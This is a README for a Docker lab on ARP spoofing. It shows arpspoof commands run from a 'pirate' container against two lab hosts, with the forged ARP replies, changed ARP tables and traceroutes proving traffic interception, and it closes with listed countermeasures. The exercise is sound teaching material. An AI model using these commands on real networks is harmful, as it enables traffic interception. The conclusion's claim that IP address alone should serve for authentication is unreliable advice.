# Spoofing

## Content
- [Spoofing](#spoofing)
  - [Content](#content)
  - [Work Environment](#work-environment)
  - [Work Process](#work-process)
    - [arpspoof](#arpspoof)
    - [How to run](#how-to-run)
    - [Result](#result)
  - [Interpretation](#interpretation)
  - [Conclusion](#conclusion)

## Work Environment
The work environment is consisted of:
- three services
  - machine_1:
    - purpose: connect to machine_2, preview traceroute
    - tools: `traceroute`
    - ip: 10.10.10.2
  - machine_2:
    - ip: 10.10.10.3
  - pirate:
    - purpose: execute Arp Spoofing attack
    - tools: `arpspoof`
    - ip: 10.10.10.4
- log file
  - `./log/output.log`
- environment configuration in `.env` contains:
  - ip addresses configuration
  - commands to execute for machine_1 and pirate
  - paths for script for log file and script file
- `goal.bash`: script to execute machine_1 and pirate commands. (_be sure that goal.bash is executable_)
- `docker-compose.yml` configuration
  

## Work Process
### arpspoof
> arpspoof mounts an ARP spoofing attack against a host on the local network. This results in traffic from the attacked host to the default gateway (and all non-LAN hosts) and back going through the local computer and can thus be captured with tools like Wireshark. arpspoof will also forward this traffic, so Windows does NOT have to be configured as a router. [github/alandau]

### How to run
- execute docker-compose: `docker-compose up`
- in both `pirate` and `machine_1`, we execute `goal.bash` wich will execute the sequence of commands inside `.env` file
  - `docker exec -it machine_1 goal.bash`
  - `docker exec -it pirate goal.bash`


### Result
We'll have as a result:
- machine_1
``` bash
>>> press <enter> to execute (traceroute $IP_MACHINE_2)
traceroute to 10.10.10.3 (10.10.10.3), 30 hops max, 60 byte packets
 1  machine_2.exercice_3_network_ip (10.10.10.3)  0.187 ms  0.060 ms  0.061 ms
>>> press <enter> to execute (arp -a)
machine_2.exercice_3_network_ip (10.10.10.3) at 02:42:0a:0a:0a:03 [ether] on eth0
```
- pirate
``` bash
>>> press <enter> to execute (arpspoof -t $IP_MACHINE_1 $IP_MACHINE_2)
2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:2 0806 42: arp reply 10.10.10.3 is-at
```
- machine_1
``` bash
>>> press <enter> to execute (arp -a)
machine_2.exercice_3_network_ip (10.10.10.3) at 02:42:0a:0a:0a:04 [ether] on eth0
pirate.exercice_3_network_ip (10.10.10.4) at 02:42:0a:0a:0a:04 [ether] on eth0

>>> press <enter> to execute (traceroute $IP_MACHINE_2)
traceroute to 10.10.10.3 (10.10.10.3), 30 hops max, 60 byte packets
 1  pirate.exercice_3_network_ip (10.10.10.4)  0.120 ms  0.060 ms  0.048ms
 2  machine_2.exercice_3_network_ip (10.10.10.3)  0.079 ms  0.064 ms  0.067 ms
```
- pirate
``` bash
>>> press <enter> to execute (arpspoof -t $IP_MACHINE_2 $IP_MACHINE_1)
2:42:a:a:a:4 2:42:a:a:a:3 0806 42: arp reply 10.10.10.2 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:3 0806 42: arp reply 10.10.10.2 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:3 0806 42: arp reply 10.10.10.2 is-at 2:42:a:a:a:4
2:42:a:a:a:4 2:42:a:a:a:3 0806 42: arp reply 10.10.10.2 is-at 2:42:a:a:a:4
```

> full log will be stored in [./log/output.log](./log/output.log)


## Interpretation
- After `arpspoof` attack, a new line has been added to the arp table showen insde `machine_1` 
  - `pirate.exercice_3_network_ip (10.10.10.4) at 02:42:0a:0a:0a:04 [ether] on eth0`
  - The mac address of the target `machine_1` has been changed from `02:42:0a:0a:0a:03` to `02:42:0a:0a:0a:04` which is the mac adress of the pirate.
- When executing traceroute to `machine_2`, a new line has been added
  -  `1  pirate.exercice_3_network_ip (10.10.10.4)  0.120 ms  0.060 ms  0.048ms`
  -  The requesets to `machine_2` will be recieved by `pirate`
- In the end, we send `arpspoof` attack to `machine_2`




## Conclusion
- The attack may have strong impact if it is combined with `Dos` attack to prevent any probabilty of connection from the target machine we want to contact
- We should consider only ip address as the unique method for authentication.
- As counter measurment, we have to use other anti-arp solutions like:
  - DHCP snopping
  - cisco..
  - Xarp,.. 



[github/alandau]: https://github.com/alandau/arpspoof
